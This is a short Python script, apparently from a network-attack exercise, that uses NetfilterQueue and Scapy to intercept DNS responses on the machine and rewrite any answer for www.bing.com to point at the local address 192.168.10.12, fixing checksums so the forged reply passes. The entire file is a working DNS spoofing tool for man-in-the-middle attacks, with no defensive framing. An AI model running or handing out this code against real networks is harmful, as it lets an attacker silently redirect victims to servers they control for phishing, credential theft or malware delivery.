#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR) and scapy_packet.haslayer(scapy.UDP):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        website = "www.bing.com"

        if website in qname:
            print("[+] Spoofing target...")
            answer = "192.168.10.12"
            dnsrr = scapy.DNSRR(rrname=qname, rdata=answer)
            scapy_packet[scapy.DNS].an = dnsrr
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            if scapy_packet.haslayer(scapy.UDP):
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0,process_packet)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
